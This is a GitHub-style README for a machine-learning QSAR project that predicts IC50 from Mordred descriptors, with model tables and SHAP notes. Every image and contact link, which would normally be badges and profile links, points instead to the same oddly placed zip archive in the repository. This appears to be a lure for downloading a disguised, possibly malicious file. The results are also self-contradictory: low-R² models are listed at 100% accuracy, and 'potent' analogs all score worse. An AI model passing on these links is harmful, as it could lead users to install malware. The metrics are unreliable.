<h1 align="center">🔬 Machine Learning-Based QSAR Analysis</h1>
<p align="center">A Step-by-Step Pipeline for Predicting IC50 & Structural Optimization Using Atom-Based QSAR</p>

<p align="center">
  <img src="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/QSA-Analysis-Machine-based-learning-3.3.zip" />
  <img src="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/QSA-Analysis-Machine-based-learning-3.3.zip" />
  <img src="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/QSA-Analysis-Machine-based-learning-3.3.zip" />
</p>

> ⚠️ **Disclaimer:** Dataset not shared due to  confidentiality. Results are reproducible with custom data.

---

## 📁 Table of Contents

- [Overview](#-project-overview)
- [Deliverables](#-project-deliverables)
- [Dataset](#-dataset-client-owned-not-included)
- [Methodology](#-methodology-summary)
- [Results](#-final-model-performance)
- [Visualizations](#-visualizations)
- [Libraries Used](#-libraries-used)
- [Conclusion](#-conclusion)
- [Confidentiality](#-confidentiality-notice)
- [Contact](#-contact)

---

## 🧪 Project Overview

This repository provides a full-stack **Atom-Based QSAR modeling pipeline** designed to:
- Predict IC50 values (activity) from molecular structures
- Interpret model predictions using SHAP
- Optimize compounds via structural analogs

🎯 **Goal:** Leverage machine learning to support data-driven **Structure-Activity Relationship (SAR)** decisions.

---

## 📦 Project Deliverables

✅ Fully documented Jupyter notebooks  
✅ Regression models with SHAP interpretation  
✅ Visual analysis of descriptor impact  
✅ Analog generation to propose new potent structures

📌 Models Trained:
- `RandomForest`
- `ElasticNet`
- `XGBoost`
- `Ridge Regression`

---

## 🧬 Dataset *(Client-Owned, Not Included)*

- 16 small molecules  
- Contains SMILES & experimental IC50 values  
- Data processed but **not uploaded** due to NDA

📎 *You may insert a sample SMILES molecule as an image here to represent the dataset.*  
<!-- INSERT A SIMPLE MOLECULE IMAGE WITH LABEL “Example SMILES Molecule” -->

---

## 🔬 Methodology Summary

### 1. Descriptor Calculation
- Used `Mordred` to generate **1600+ descriptors**
- After filtering: **1137 numeric descriptors** retained
- Preprocessing included removal of:
  - Constant features
  - Missing/non-numeric values

### 2. Model Training & Evaluation
Models were assessed based on:

| Metric | Description |
|--------|-------------|
| **R² Score** | Predictive power |
| **MAE** | Model error |
| **±0.5 Accuracy** | Acceptable IC50 prediction range |

> 🔧 *Add animated progress bars or step indicators here for each stage (Optional but useful)*

### 3. Explainability with SHAP
- Used SHAP **beeswarm** and **waterfall** plots
- Key Features:  
  - `PEOE_VSA7`  
  - `MaxAbsPartialCharge`  
  - Other charge/electrostatic descriptors

### 4. Analog Design
- Top 5 potent compounds analyzed
- RDKit used to generate analogs
- Model re-evaluated analogs vs. parents:

| Compound | Parent pIC50 | Analog pIC50 | Δ Change |
|----------|--------------|--------------|----------|
| FI-3-8   | 4.92         | 4.82         | -0.10    |
| FI-3     | 4.88         | 4.75         | -0.13    |
| FI-3-1   | 4.77         | 4.69         | -0.08    |
| FI-3-12  | 4.79         | 4.70         | -0.09    |

<!-- 🔍 Suggestion: Add molecule structure comparison image here (Parent vs. Analog) -->

---

## 📊 Final Model Performance

| Model        | R² Score | MAE    | Accuracy (±0.5) | Notes        |
|--------------|----------|--------|------------------|--------------|
| ElasticNet   | 0.7877   | 0.1004 | ✅ 100%          | ✅ Best model |
| RandomForest | ~0.24    | 0.2400 | ✅ 100% (Overfit)| ⚠️ Overfitting |
| XGBoost      | ~0.29    | 0.2900 | ⚠️ 75%           | ⚠️ Overfit risk |

📌 *Initial overfitting reduced by feature filtering & analog testing*

---

## 📈 Visualizations

> ⚠️ Replace the placeholders below with actual graphs (SHAP, histograms, comparisons)

| 📊 Plot Type     | 📝 Description                     |
|------------------|------------------------------------|
| SHAP Beeswarm    | Global feature impact               |
| SHAP Waterfall   | Single-sample explanation           |
| IC50 Comparison  | Parent vs analog predictions        |
| Descriptor Hist  | Distribution of top molecular features |

<!-- Use matplotlib/seaborn/plotly graphs or GIFs here for animated charts -->

---

## 🤖 Libraries Used

```bash
✔ pandas
✔ numpy
✔ scikit-learn
✔ xgboost
✔ matplotlib / seaborn
✔ mordred-descriptors
✔ rdkit
✔ shap

```
---

## 📫 Contact Me

I'm open to collaboration, freelance projects, or discussing QSAR/bioinformatics-related work.

<p align="left">
  <a href="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/QSA-Analysis-Machine-based-learning-3.3.zip" target="_blank">
    <img src="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/QSA-Analysis-Machine-based-learning-3.3.zip" />
  </a>
  <a href="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/QSA-Analysis-Machine-based-learning-3.3.zip">
    <img src="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/QSA-Analysis-Machine-based-learning-3.3.zip" />
  </a>
</p>

